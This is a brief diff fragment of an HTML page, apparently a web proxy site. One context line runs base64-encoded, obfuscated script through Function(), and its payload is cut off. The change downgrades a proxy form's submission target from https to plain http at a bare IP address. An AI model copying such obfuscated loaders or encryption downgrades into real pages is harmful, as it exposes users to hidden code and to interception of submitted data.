@@ -755,7 +755,7 @@ Function(new TextDecoder('utf-8').decode(new Uint8Array((atob('NzY2MTcyMjA2MTMwN
 
 
 <!-- CP_FORM_TAG --><div id="proxyForm" dir="ltr" style="height: auto !important;">
-        <form class="proxyFormPremium" method="post" id="request" action="https://143.244.207.157/servers" data-gtm-form-interact-id="0">
+        <form class="proxyFormPremium" method="post" id="request" action="http://143.244.207.157/servers" data-gtm-form-interact-id="0">
                     <div class="input-group input-group-lg">
                 <div class="typeahead__container result hint">
                     <div class="typeahead__field">
